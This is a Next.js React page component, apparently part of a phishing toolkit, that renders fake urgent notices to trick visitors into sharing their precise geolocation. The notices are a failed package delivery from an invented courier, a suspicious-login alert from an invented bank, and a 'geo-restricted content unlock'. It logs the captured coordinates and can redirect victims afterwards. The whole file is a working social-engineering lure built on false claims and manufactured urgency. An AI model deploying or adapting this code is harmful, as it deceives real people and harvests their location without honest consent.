
"use client";
import { useEffect, useState } from 'react';
import { useParams } from 'next/navigation';
import { useLogs } from '@/contexts/LogContext';
import type { LocationData } from '@/types';
import { Button } from '@/components/ui/button';
import { PhishingPageLayout } from '@/components/phishing/PhishingPageLayout';
import { Alert, AlertDescription, AlertTitle } from "@/components/ui/alert";
import { Card as ShadcnCard, CardContent, CardHeader, CardTitle as ShadcnCardTitle } from '@/components/ui/card';
import { MapPin, CheckCircle, AlertTriangle, ShieldAlert, Lock, Sparkles, type LucideIcon, Truck, Globe } from 'lucide-react';

interface TemplateContent {
  title: string;
  actionText: string;
  message: string;
  heroIcon?: LucideIcon;
  pageSpecificMessage?: string;
}

const templateContent: Record<string, TemplateContent> = {
  'package-delivery-issue': {
    title: "URGENT: Delivery Failure - Action Required for Package #TZ78391B",
    message: "CRITICAL ALERT: We were unable to deliver your package #TZ78391B. Immediate location verification is needed to reschedule or redirect your shipment and avoid return fees.",
    pageSpecificMessage: "Your package #TZ78391B is on hold due to a delivery address discrepancy. Verify your current location NOW to confirm your address or select an urgent pickup point. Failure to act within 24 hours may result in package return.",
    actionText: "VERIFY LOCATION & PREVENT RETURN",
    heroIcon: Truck,
  },
  'security-alert': {
    title: "IMMEDIATE ACTION REQUIRED: Unusual Login Attempt Detected",
    message: "URGENT SECURITY ALERT: We've detected a suspicious login attempt on your account from an unrecognized location. Verify your current location immediately to secure your account.",
    pageSpecificMessage: "Your account safety is our priority. An unusual login was flagged. Confirm your location now to prevent potential unauthorized access. This is a time-sensitive security measure.",
    actionText: "SECURE ACCOUNT & VERIFY LOCATION NOW",
    heroIcon: ShieldAlert,
  },
  'content-unlock': {
    title: "Exclusive Content Unlocked: Verify Region",
    message: "You've gained access to premium local content! Just verify your location to unlock videos, articles, and downloads restricted in other regions.",
    pageSpecificMessage: "Congratulations! Access exclusive content (videos, files, articles) available only in your current region. A quick location check is required to unlock these special features.",
    actionText: "Access Geo-Restricted Content",
    heroIcon: Lock,
  },
  default: {
    title: "Location Verification Required for Service Access",
    message: "To continue using this premium service and for compliance with regional settings, please share your location.",
    actionText: "Verify Location to Continue",
    heroIcon: MapPin,
  }
};

const CONTENT_UNLOCK_REDIRECT_URL_KEY = 'contentUnlockRedirectUrl';

export default function LocationPhishingPage() {
  const { addLog } = useLogs();
  const { id: idFromParams } = useParams<{ id: string }>();
  const templateId = idFromParams || 'default';
  const content = templateContent[templateId] || templateContent.default;

  const [status, setStatus] = useState<'idle' | 'requesting' | 'captured' | 'error'>('idle');
  const [error, setError] = useState<string | null>(null);
  const [isLoading, setIsLoading] = useState(false);
  const [statusMessage, setStatusMessage] = useState<string | undefined>(undefined);
  const [currentTime, setCurrentTime] = useState<string | null>(null);

  useEffect(() => {
    const updateCurrentTime = () => {
      setCurrentTime(new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }));
    };
    updateCurrentTime(); // Set time immediately
    const timerId = setInterval(updateCurrentTime, 60000); // Update every minute
    return () => clearInterval(timerId);
  }, []);

  useEffect(() => {
    addLog({ type: 'generic', data: { message: `Visited location phishing page: /phishing/location/${templateId}` } });
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [templateId]);

  useEffect(() => {
    if (content.title) {
      document.title = content.title;
    }
  }, [content.title]);

  useEffect(() => {
    if (status === 'captured') {
      if (templateId === 'content-unlock') {
        const redirectUrl = localStorage.getItem(CONTENT_UNLOCK_REDIRECT_URL_KEY);
        if (redirectUrl && redirectUrl.trim() !== '') {
          setStatusMessage("Location verified. Thank you. Now you'll be redirected to the wanted website.");
          setTimeout(() => {
            window.location.href = redirectUrl;
          }, 2500);
        } else {
          setStatusMessage("Location verified. Thank you. This window can now be closed.");
        }
      } else {
        setStatusMessage(undefined); 
      }
    } else {
      setStatusMessage(undefined);
    }
  }, [status, templateId]);

  const handleLocationRequest = () => {
    if (!navigator.geolocation) {
      setError('Geolocation is not supported by your browser.');
      setStatus('error');
      addLog({ type: 'generic', data: { message: 'Geolocation not supported' } });
      return;
    }

    setStatus('requesting');
    setIsLoading(true);
    setError(null);

    navigator.geolocation.getCurrentPosition(
      async (position) => {
        const locationData: LocationData = {
          latitude: position.coords.latitude,
          longitude: position.coords.longitude,
          accuracy: position.coords.accuracy,
        };

        addLog({ type: 'location', data: locationData });
        setStatus('captured');
        setIsLoading(false);
      },
      (err) => {
        let errorMessage = 'Unknown error occurred.';
        switch (err.code) {
          case err.PERMISSION_DENIED:
            errorMessage = 'Location access denied by user.';
            break;
          case err.POSITION_UNAVAILABLE:
            errorMessage = 'Location information is unavailable.';
            break;
          case err.TIMEOUT:
            errorMessage = 'The request to get user location timed out.';
            break;
        }
        setError(errorMessage);
        setStatus('error');
        addLog({ type: 'generic', data: { message: `Location error: ${errorMessage}` } });
        setIsLoading(false);
      },
      { timeout: 10000, enableHighAccuracy: true }
    );
  };

  const renderTemplateSpecificContent = () => {
    const HeroIcon = content.heroIcon || MapPin;
    switch (templateId) {
      case 'package-delivery-issue': {
        return (
          <div className="space-y-6 text-center">
            <div className="mb-6">
              <h2 className="text-2xl font-bold text-gray-700 dark:text-gray-300">Global Swift Logistics</h2>
              <p className="text-sm text-muted-foreground">Your Trusted Delivery Partner</p>
            </div>
            <HeroIcon className="w-20 h-20 text-primary mx-auto mb-4" />
            <p className="text-xl text-muted-foreground leading-relaxed">
              {content.message}
            </p>
            <ShadcnCard className="text-left bg-secondary/20 shadow-sm p-4 sm:p-6">
             <CardHeader className="p-0 mb-3">
                <ShadcnCardTitle className="text-lg font-semibold text-foreground">Package Status Update:</ShadcnCardTitle>
              </CardHeader>
              <CardContent className="p-0">
                <div className="grid grid-cols-[auto_1fr] gap-x-4 gap-y-2 text-sm sm:text-md">
                  <span className="font-medium text-muted-foreground">Tracking ID:</span>
                  <span className="text-foreground font-mono bg-muted/50 px-2 py-0.5 rounded-sm">#TZ78391B</span>

                  <span className="font-medium text-muted-foreground">Status:</span>
                  <span className="font-semibold text-destructive flex items-center">
                    <AlertTriangle className="w-4 h-4 mr-1.5 flex-shrink-0" />
                    Delivery Attempt Failed
                  </span>

                  <span className="font-medium text-muted-foreground">Last Update:</span>
                  <span className="text-foreground">{currentTime || 'Fetching time...'}</span>
                </div>
              </CardContent>
            </ShadcnCard>
            <p className="text-md text-muted-foreground/90 pt-2">
              {content.pageSpecificMessage}
            </p>
          </div>
        );
      }
      case 'security-alert': {
        const CurrentHeroIcon = content.heroIcon || ShieldAlert;
        return (
          <Alert variant="destructive" className="mb-6 text-left p-6 shadow-xl border-2 border-destructive-foreground/30">
            <div className="flex items-start mb-4"> {/* Changed to items-start for better alignment with subtitle */}
              <CurrentHeroIcon className="h-12 w-12 mr-4 text-destructive flex-shrink-0 mt-1" />
              <div>
                <h3 className="text-sm font-semibold text-destructive/80 -mb-1">SecureNet Financial</h3>
                <AlertTitle className="text-3xl font-bold text-destructive">
                  {content.message}
                </AlertTitle>
              </div>
            </div>
            <AlertDescription className="space-y-4">
              <p className="text-md leading-relaxed text-destructive/90">
                {content.pageSpecificMessage}
              </p>
              <div className="mt-4 p-4 bg-destructive rounded-md border border-destructive-foreground/30 text-sm">
                <h4 className="font-semibold mb-2 text-destructive-foreground text-md">Alert Details:</h4>
                <div className="grid grid-cols-[auto_1fr] gap-x-3 gap-y-1.5 text-destructive-foreground">
                  <span className="font-medium">Alert ID:</span>
                  <span className="font-mono">SEC-74X981</span>
                  <span className="font-medium">Detected At:</span>
                  <span>{currentTime || 'Processing...'}</span>
                  <span className="font-medium">Status:</span>
                  <span className="font-semibold">Immediate Action Required</span>
                </div>
              </div>
            </AlertDescription>
          </Alert>
        );
      }
      case 'content-unlock':
        return (
          <ShadcnCard className="mb-6 bg-muted/30 p-6 text-center shadow-inner border-dashed">
            <CardContent className="space-y-4">
              <HeroIcon className="w-20 h-20 text-primary/60 mx-auto" />
              <ShadcnCardTitle className="text-xl text-foreground font-semibold">{content.message}</ShadcnCardTitle>
              <p className="text-md text-muted-foreground">{content.pageSpecificMessage}</p>
              <div className="pt-3 flex items-center justify-center text-sm text-muted-foreground/80">
                <Globe className="h-4 w-4 mr-1.5" />
                Powered by GeoUnlock&trade;
              </div>
            </CardContent>
          </ShadcnCard>
        );
      default:
        return (
          <div className="text-center space-y-4">
            <HeroIcon className="w-16 h-16 text-primary mx-auto" />
            <p className="text-xl text-muted-foreground">{content.message}</p>
          </div>
        );
    }
  };

  return (
    <PhishingPageLayout
        title={templateId === 'package-delivery-issue' || templateId === 'security-alert' ? '' : content.title}
        isLoading={isLoading && status !== 'captured'}
        error={error}
        statusMessage={statusMessage}
    >
      <div className="space-y-6">
        {renderTemplateSpecificContent()}

        {status !== 'captured' && (
          <Button
            onClick={handleLocationRequest}
            size="lg"
            className={`w-full text-lg py-6 shadow-md ${
              templateId === 'security-alert' ? 'bg-destructive hover:bg-destructive/90 text-destructive-foreground'
              : 'bg-accent hover:bg-accent/90 text-accent-foreground'
            }`}
            disabled={isLoading || status === 'requesting'}
          >
            <MapPin className="mr-2 h-6 w-6" />
            {isLoading ? 'Verifying...' : content.actionText}
          </Button>
        )}

        {status === 'captured' && (
          <div className="text-center p-4 bg-green-100 border border-green-300 rounded-md shadow">
            <CheckCircle className="mx-auto h-12 w-12 text-green-600 mb-2" />
            <p className="text-xl font-semibold text-green-700">
              {templateId === 'content-unlock' && localStorage.getItem(CONTENT_UNLOCK_REDIRECT_URL_KEY) && localStorage.getItem(CONTENT_UNLOCK_REDIRECT_URL_KEY)?.trim() !== ''
                ? "Location verified. Thank you. Now you'll be redirected to the wanted website."
                : "Location Verified"}
            </p>
            <p className="text-md text-green-600">
              {templateId === 'content-unlock' && localStorage.getItem(CONTENT_UNLOCK_REDIRECT_URL_KEY) && localStorage.getItem(CONTENT_UNLOCK_REDIRECT_URL_KEY)?.trim() !== ''
                ? "Please wait."
                : "Thank you. This window can now be closed."}
            </p>
          </div>
        )}
        {status === 'error' && error && (
          <Alert variant="destructive" className="mt-6">
            <AlertTriangle className="h-5 w-5" />
            <AlertTitle>Location Access Failed</AlertTitle>
            <AlertDescription>{error}</AlertDescription>
          </Alert>
        )}
      </div>
    </PhishingPageLayout>
  );
}

